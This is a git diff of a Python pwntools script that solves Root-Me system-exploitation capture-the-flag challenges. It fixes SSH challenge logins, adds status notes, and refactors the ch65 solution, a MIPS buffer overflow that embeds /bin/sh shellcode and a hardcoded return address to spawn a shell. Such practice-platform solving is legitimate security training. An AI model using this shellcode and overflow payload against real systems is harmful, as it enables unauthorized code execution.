@@ -35,9 +35,9 @@ def run_overflow(c, p, f):
 def ch12():
     '''Not working.'''
     bin_file = "ch12"
-    conn = ssh('app-systeme-ch13',
+    conn = ssh('app-systeme-ch12',
                'challenge02.root-me.org',
-               password='app-systeme-ch13',
+               password='app-systeme-ch12',
                port=2222)
     context.clear()
     context.update(os='linux', arch='i386', log_level='debug')
@@ -84,6 +84,7 @@ def ch15():
 
 
 def ch17():
+    '''In Progress.'''
     conn = ssh('app-systeme-ch17',
                'challenge02.root-me.org',
                password='app-systeme-ch17',
@@ -106,7 +107,7 @@ def ch17():
 
 
 def ch35():
-    '''Working fine.'''
+    '''Working.'''
     bin_file = "ch35"
     conn = ssh('app-systeme-ch35',
                'challenge03.root-me.org',
@@ -167,6 +168,7 @@ def ch45():
 
 
 def ch65():
+    '''In progress.'''
     conn = ssh('app-systeme-ch65',
                'challenge03.root-me.org',
                password='app-systeme-ch65',
@@ -175,18 +177,16 @@ def ch65():
     context.update(arch='mips', endian='big')
     # http://shell-storm.org/shellcode/files/shellcode-782.php
     shellcode = b'\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27\xbd\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f\xab\x01\x01\x01\x0c/bin/sh\x00'
-    r = conn.process(["qemu-mips", "./ch65"])
-    shellcode_addr = 0x76fff6a8+0x14+4
-    log.info("shellcode_addr: %#x" % shellcode_addr)
-    payload = b'A'*0x14
+    shellcode_addr = 0x76fff6a8+20+4
+    log.info("'A' * " + str(20) + " + shellcode_addr (%#x) + shellcode" % shellcode_addr)
+    payload = b'A'*20
     payload += packing.p32(shellcode_addr)
     payload += shellcode
-    r.send(payload)
-    r.interactive()
+    run_overflow(conn, payload, ["qemu-mips", "./ch65"])
 
 
 def ch72():
-    '''Working fine..
+    '''Working fine.
     To Do: parse pe header to get the admin_shell address'''
     # bin_file = "ch72.exe"
     conn = ssh('app-systeme-ch72',
